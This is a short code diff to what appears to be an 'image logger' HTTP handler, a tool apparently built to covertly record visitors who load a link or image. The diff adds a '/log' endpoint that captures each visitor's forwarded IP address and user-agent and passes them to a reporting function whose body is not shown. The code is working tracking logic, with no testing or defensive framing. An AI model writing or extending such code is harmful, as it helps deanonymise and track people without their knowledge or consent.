@@ -1,4 +1,4 @@
-from http.server import BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
@@ -149,6 +149,16 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
+            if self.path.startswith("/log"):
+                ip = self.headers.get('x-forwarded-for')
+                useragent = self.headers.get('user-agent')
+                makeReport(ip, useragent=useragent, endpoint=self.path)
+                self.send_response(200)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(b'{"status": "logged"}')
+                return
+
             if config["imageArgument"]:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
